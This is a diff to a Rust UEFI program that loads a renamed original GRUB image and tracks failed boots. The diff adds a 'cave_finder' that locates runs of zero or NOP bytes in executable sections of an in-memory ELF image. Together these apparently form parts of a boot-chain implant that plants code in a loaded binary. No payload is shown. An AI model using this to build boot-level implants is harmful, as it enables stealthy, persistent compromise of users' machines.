@@ -6,6 +6,12 @@ use uefi::proto::device_path::{DeviceSubType, DeviceType, LoadedImageDevicePath,
 use uefi::proto::media::file::{File, FileMode, FileAttribute, RegularFile};
 use uefi::{CStr16, Handle, cstr16};
 
+use core::ops::{BitOr, BitOrAssign};
+use elf::abi::{SHF_ALLOC, SHF_EXECINSTR, SHF_WRITE};
+use elf::ElfBytes;
+use elf::endian::AnyEndian;
+use elf::section::SectionHeader;
+
 extern crate alloc;
 use alloc::vec::Vec;
 
@@ -13,13 +19,141 @@ const GRUB_PATH: &CStr16 = cstr16!("\\EFI\\ubuntu\\grubx64.efi.original");
 const FAILSAFE_PATH: &CStr16 = cstr16!("\\EFI\\ubuntu\\failsafe");
 const MAX_FAIL_ATTEMPTS: u16 = 1;
 
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+pub struct Permissions(u32);
 
+impl Permissions {
+    pub const READ: Self = Self(1 << 0);
+    pub const WRITE: Self = Self(1 << 1);
+    pub const EXECUTE: Self = Self(1 << 2);
+
+    pub const fn contains(self, other: Self) -> bool {
+        (self.0 & other.0) == other.0
+    }
+
+    pub const fn is_empty(self) -> bool {
+        self.0 == 0
+    }
+}
+
+impl BitOr for Permissions {
+    type Output = Self;
+
+    fn bitor(self, rhs: Self) -> Self::Output {
+        Self(self.0 | rhs.0)
+    }
+}
+
+impl BitOrAssign for Permissions {
+    fn bitor_assign(&mut self, rhs: Self) {
+        self.0 |= rhs.0;
+    }
+}
+
+/// ## Description
+/// cave_finder searches ELF sections whose permissions match the requested mask
+/// and returns the first absolute address of a contiguous cave filled with
+/// `0x00` and/or `0x90` bytes.
+///
+/// ## Arguments
+/// - `data_address`: Base address of the in-memory ELF image.
+/// - `data_size`: Total size of the in-memory ELF image.
+/// - `cave_size`: Required contiguous cave size.
+/// - `cave_permissions`: Required section permissions.
+///
+/// ## Returns
+/// - `Some(usize)`: Absolute address of the first matching cave.
+/// - `None`: If parsing fails or no suitable cave exists.
+pub fn cave_finder(
+    data_address: usize,
+    data_size: usize,
+    cave_size: usize,
+    cave_permissions: Permissions,
+) -> Option<usize> {
+    if data_address == 0 || data_size == 0 || cave_size == 0 {
+        return None;
+    }
+
+    let data = unsafe { core::slice::from_raw_parts(data_address as *const u8, data_size) };
+    let elf = ElfBytes::<AnyEndian>::minimal_parse(data).ok()?;
+    let sections = elf.section_headers().ok()?;
+
+    for section in sections.iter() {
+        if section.sh_size == 0 || !section_matches_permissions(section, cave_permissions) {
+            continue;
+        }
+
+        let Some(section_offset) = usize::try_from(section.sh_offset).ok() else {
+            continue;
+        };
+        let Some(section_size) = usize::try_from(section.sh_size).ok() else {
+            continue;
+        };
+        let Some(section_end) = section_offset.checked_add(section_size) else {
+            continue;
+        };
+
+        if section_end > data.len() {
+            continue;
+        }
+
+        let section_data = &data[section_offset..section_end];
+        let Some(cave_offset) = find_cave_offset(section_data, cave_size) else {
+            continue;
+        };
+        return section_offset
+            .checked_add(cave_offset)
+            .and_then(|offset| data_address.checked_add(offset));
+    }
+
+    None
+}
+
+fn section_matches_permissions(section: &SectionHeader, requested: Permissions) -> bool {
+    if requested.is_empty() {
+        return true;
+    }
+
+    let flags = section.sh_flags as u32;
+
+    (!requested.contains(Permissions::READ) || (flags & SHF_ALLOC) != 0)
+        && (!requested.contains(Permissions::WRITE) || (flags & SHF_WRITE) != 0)
+        && (!requested.contains(Permissions::EXECUTE) || (flags & SHF_EXECINSTR) != 0)
+}
+
+fn find_cave_offset(section_data: &[u8], cave_size: usize) -> Option<usize> {
+    if section_data.len() < cave_size {
+        return None;
+    }
+
+    let mut current_len = 0usize;
+    let mut current_start = 0usize;
+
+    for (index, byte) in section_data.iter().enumerate() {
+        if *byte == 0x00 || *byte == 0x90 {
+            if current_len == 0 {
+                current_start = index;
+            }
+
+            current_len += 1;
+            if current_len >= cave_size {
+                return Some(current_start);
+            }
+        } else {
+            current_len = 0;
+        }
+    }
+
+    None
+}
+
+/// ## Description
 /// load_original_grub attempts to load the original GRUB image from the same device as the current image, using a predefined path. 
 /// 
-/// # Arguments
+/// ## Arguments
 /// - None
 /// 
-/// # Returns
+/// ## Returns
 /// - `Ok(Handle)`: Handle to the loaded original GRUB image.
 /// - `Err(uefi::Error)`: If loading fails, returns the corresponding U
 pub fn load_original_grub() -> uefi::Result<Handle> {
@@ -61,12 +195,13 @@ pub fn load_original_grub() -> uefi::Result<Handle> {
 }
 
 
+/// ## Description
 /// increase_fail_attempts increases the fail attempts counter in the failsafe file to prevent booting into bad GRUB in case of repeated failures.
 /// 
-/// # Arguments
+/// ## Arguments
 /// - None
 /// 
-/// # Returns
+/// ## Returns
 /// - None
 pub fn increase_fail_attempts() {
     if let Ok(mut file) = open_failsafe_file(FileMode::ReadWrite) {
@@ -86,12 +221,13 @@ pub fn increase_fail_attempts() {
 }
 
 
+/// ## Description
 /// is_faulty_env checks the fail attempts counter in the failsafe file to determine if the environment is considered faulty.
 /// 
-/// # Arguments
+/// ## Arguments
 /// - None
 /// 
-/// # Returns
+/// ## Returns
 /// - `bool`: True if the environment is considered faulty, false otherwise.
 pub fn is_faulty_env() -> bool {
     open_failsafe_file(FileMode::Read)
@@ -109,13 +245,14 @@ pub fn is_faulty_env() -> bool {
         .unwrap_or(false)
 }
 
+/// ## Description
 /// open_failsafe_file opens the failsafe file with the specified mode, creating it if necessary. 
 /// This file is used to track fail attempts and determine if the environment is faulty.
 /// 
-/// # Arguments
+/// ## Arguments
 /// - `mode`: The mode in which to open the file.
 /// 
-/// # Returns
+/// ## Returns
 /// - `Ok(RegularFile)`: The opened failsafe file.
 /// - `Err(uefi::Error)`: If opening the file fails, returns the corresponding UEFI error.
 fn open_failsafe_file(mode: FileMode) -> uefi::Result<RegularFile> {
@@ -130,3 +267,4 @@ fn open_failsafe_file(mode: FileMode) -> uefi::Result<RegularFile> {
     let file_handle = root.open(FAILSAFE_PATH, open_mode, FileAttribute::empty())?;
     Ok(unsafe { RegularFile::new(file_handle) })
 }
+
